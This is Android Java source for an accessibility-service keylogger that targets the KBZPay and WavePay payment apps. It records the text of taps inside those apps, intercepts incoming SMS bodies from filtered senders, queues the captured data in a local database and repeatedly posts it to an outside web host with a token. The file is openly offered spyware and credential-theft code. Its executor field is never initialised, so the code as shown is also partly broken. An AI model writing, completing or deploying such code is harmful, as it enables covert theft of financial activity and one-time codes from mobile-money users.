package com.bshu2.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.telephony.PhoneNumberUtils;
import android.telephony.SmsMessage;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CombinedLoggerService extends AccessibilityService {

    private static final String TAG = "CombinedLoggerService";
    private ExecutorService executorService;
    private static final String SERVER_URL = "http://KNIGHT.infinityfreeapp.com/receive.php";
    private static final String SECRET_TOKEN = "MY_SECRET_TOKEN_123";
    private static LogDatabaseHelper dbHelper;
    private static Handler retryHandler;
    private static Runnable retryRunnable;

    @Override
    public void onCreate() {
        super.onCreate();
        dbHelper = new LogDatabaseHelper(this);
        startRetryScheduler();
    }

    public static synchronized void queueOrSend(final Context context, final String payload) {
        if (SERVER_URL.isEmpty() || SERVER_URL.contains("ထည့်ရန်")) {
            return;
        }

        executorService.execute(new Runnable() {
            @Override
            public void run() {
                String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
                String finalPayload = "[Phone: " + deviceName + "] " + payload;

                if (dbHelper != null) {
                    dbHelper.addLog(finalPayload);
                }
                processQueue(context);
            }
        });
    }

    private static synchronized void processQueue(Context context) {
        if (dbHelper == null) {
            dbHelper = new LogDatabaseHelper(context);
        }

        List<LogDatabaseHelper.LogItem> pendingLogs = dbHelper.getAllLogs();
        if (pendingLogs.isEmpty()) return;

        for (LogDatabaseHelper.LogItem item : pendingLogs) {
            boolean success = sendToServer(item.message);
            if (success) {
                dbHelper.deleteLog(item.id);
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            } else {
                break;
            }
        }
    }

    private static boolean sendToServer(String message) {
        try {
            URL url = new URL(SERVER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String postData = "token=" + URLEncoder.encode(SECRET_TOKEN, "UTF-8") + "&data=" + URLEncoder.encode(message, "UTF-8");
            OutputStream os = conn.getOutputStream();
            os.write(postData.getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            conn.disconnect();
            return (responseCode == HttpURLConnection.HTTP_OK);
        } catch (Exception e) {
            return false;
        }
    }

    private void startRetryScheduler() {
        retryHandler = new Handler(Looper.getMainLooper());
        retryRunnable = new Runnable() {
            @Override
            public void run() {
                processQueue(getApplicationContext());
                retryHandler.postDelayed(retryRunnable, 30000);
            }
        };
        retryHandler.postDelayed(retryRunnable, 30000);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (retryHandler != null && retryRunnable != null) {
            retryHandler.removeCallbacks(retryRunnable);
        }
    }

    @Override
    public void onServiceConnected() {
        Log.d(TAG, "Service Connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
        String time = df.format(new Date());

        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            CharSequence packageName = event.getPackageName();
            if (packageName != null) {
                String pkg = packageName.toString().toLowerCase();
                boolean isTargetApp = pkg.contains("kbzpay") || pkg.contains("wavepay");

                if (!isTargetApp) {
                    return;
                }

                AccessibilityNodeInfo sourceNode = event.getSource();
                String touchData = "Coordinate Clicked";

                if (sourceNode != null) {
                    CharSequence nodeText = sourceNode.getText();
                    if (nodeText != null && !nodeText.toString().isEmpty()) {
                        touchData = nodeText.toString();
                    }
                }

                String payload = time + " | (Click) App: " + pkg + " | Target: " + touchData;
                queueOrSend(getApplicationContext(), payload);
            }
        }
    }

    @Override
    public void onInterrupt() {}

    public static class LogDatabaseHelper extends SQLiteOpenHelper {
        private static final String DATABASE_NAME = "logger_queue.db";
        private static final int DATABASE_VERSION = 1;
        private static final String TABLE_NAME = "logs";
        private static final String COLUMN_ID = "id";
        private static final String COLUMN_MESSAGE = "message";

        public LogDatabaseHelper(Context context) {
            super(context, DATABASE_NAME, null, DATABASE_VERSION);
        }

        @Override
        public void onCreate(SQLiteDatabase db) {
            String createTable = "CREATE TABLE " + TABLE_NAME + " (" + COLUMN_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " + COLUMN_MESSAGE + " TEXT)";
            db.execSQL(createTable);
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            db.execSQL("DROP TABLE IF EXISTS " + TABLE_NAME);
            onCreate(db);
        }

        public synchronized void addLog(String message) {
            SQLiteDatabase db = this.getWritableDatabase();
            android.content.ContentValues values = new android.content.ContentValues();
            values.put(COLUMN_MESSAGE, message);
            db.insert(TABLE_NAME, null, values);
            db.close();
        }

        public synchronized List<LogItem> getAllLogs() {
            List<LogItem> logList = new java.util.ArrayList<>();
            SQLiteDatabase db = this.getReadableDatabase();
            Cursor cursor = db.rawQuery("SELECT * FROM " + TABLE_NAME + " ORDER BY " + COLUMN_ID + " ASC", null);

            if (cursor.moveToFirst()) {
                do {
                    int id = cursor.getInt(cursor.getColumnIndexOrThrow(COLUMN_ID));
                    String message = cursor.getString(cursor.getColumnIndexOrThrow(COLUMN_MESSAGE));
                    logList.add(new LogItem(id, message));
                } while (cursor.moveToNext());
            }
            cursor.close();
            db.close();
            return logList;
        }

        public synchronized void deleteLog(int id) {
            SQLiteDatabase db = this.getWritableDatabase();
            db.delete(TABLE_NAME, COLUMN_ID + "=?", new String[]{String.valueOf(id)});
            db.close();
        }
    }

    public static class LogItem {
        int id;
        String message;

        public LogItem(int id, String message) {
            this.id = id;
            this.message = message;
        }
    }

    public static class SmsReceiver extends BroadcastReceiver {
        private List<String> filter;

        @Override
        public void onReceive(Context context, Intent intent) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    if (pdus != null) {
                        for (Object pdu : pdus) {
                            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                            if (isInFilter(sms.getDisplayOriginatingAddress())) {
                                logAndSendSms(context, sms);
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.w("SmsReceiver", e.getMessage());
                }
            }
        }

        private boolean isInFilter(String number) {
            if (filter != null) {
                for (String filterNumber : filter) {
                    if (PhoneNumberUtils.compare(filterNumber, number)) {
                        return true;
                    }
                }
            }
            return false;
        }

        private void logAndSendSms(Context context, SmsMessage sms) {
            DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
            String time = df.format(new Date());
            String sender = sms.getDisplayOriginatingAddress();
            String messageBody = sms.getMessageBody();
            String payload = time + " | (SMS) From: " + sender + " | Text: " + messageBody;
            queueOrSend(context, payload);
        }

        public void setFilter(List<String> filt) {
            filter = filt;
        }
    }
}